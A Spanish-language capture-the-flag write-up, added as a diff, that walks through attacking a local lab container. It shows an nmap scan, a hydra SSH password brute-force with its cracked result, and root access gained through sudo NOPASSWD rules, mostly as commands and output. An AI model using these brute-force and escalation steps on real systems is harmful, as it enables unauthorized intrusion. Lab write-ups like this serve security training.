@@ -1,0 +1,62 @@
+Primero realizamos un escaneo de nmap a la IP: 
+
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-05 20:49 -0500
+Nmap scan report for 172.17.0.2
+Host is up (0.0000030s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+MAC Address: 02:42:AC:11:00:02 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Tiene un puerto 80 abierto, lo que indica que si ponemos la IP en el navegador habrá una web. Al abrirlo estará un texto en index.html que dirá "tails"
+Podemos inferir que esté es un usuario del protocolo ssh que también tiene la maquina vulnerable
+
+Para conseguir la contraseña realizaremos un hydra al puerto 22 de la maquina
+
+hydra -l tails -P invertido.txt ssh://172.17.0.2
+
+Cabe notar que se uso el diccionario rockyou.txt, solo que se invirtió el orden de las palabras (tip de youtube)
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344386 login tries (l:1/p:14344386), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+^[[6~[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
+
+Teniendo como password: 3117548331
+
+La usamos para entrar: 
+
+ssh tails@172.17.0.2
+
+En principio estaremos como tails, haciendo un "cd .." veremos que hay otro usuario "sonic"
+
+Ejecutando "sudo -l" veremos que podemos escalar a "sonic"
+
+tails@900681f56e13:~$ sudo -l
+User tails may run the following commands on 900681f56e13:
+    (sonic) NOPASSWD: ALL
+
+User tails
+El usuario actual es tails.
+
+(sonic)
+Puedes ejecutar comandos como el usuario sonic.
+
+NOPASSWD
+No necesitas contraseña para usar sudo.
+
+ALL
+Puedes ejecutar cualquier comando.
+
+Por esto ejecutaremos el comando: 
+
+sudo -u sonic /bin/bash
+
+Permitiendonos escalar a "sonic"
+Una vez en "sonic" ejecturemos tambien el mismo comando pero para escalar a root
+
+sudo -u root /bin/bash
+
+Completando el laboratorio escalando privilegios
+
